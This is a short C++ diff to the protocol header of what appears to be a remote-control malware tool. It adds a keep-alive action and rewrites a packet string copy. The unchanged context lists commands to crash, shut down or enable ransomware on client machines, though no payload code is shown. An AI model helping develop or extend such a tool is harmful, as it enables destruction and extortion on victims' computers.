@@ -33,6 +33,7 @@ enum RemoteAction {
     kOpenRemoteProcess,
     kKillClient, // forcefully disconnect the client from the server
     kPingClient,
+    kKeepAlive,
     kRemoteBSOD, // cause a blue screen of death
     kRemoteShutdown, // shut down the client machine
     kRansomwareEnable, // dangerous, enable ransomware on client machine
@@ -76,8 +77,6 @@ struct ClientResponse {
     RemoteAction       actionPerformed; // ( if any, otherwise put NONE )
 };
 
-#include <iostream>
-
 /*
     Packet of information sent over sockets.
 */
@@ -93,7 +92,11 @@ struct Packet {
         buffLen = (copied == 0) ? strlen(s) : -1; 
     }
 
-    inline const void insert(std::string s) { insert(s.c_str()); }
+    inline const void insert(std::string s) { 
+        //insert(s.c_str()); 
+        strcpy_s(buffer, s.c_str());
+        buffLen = s.length();
+    }
 };
 #pragma pack(pop, 0)
 
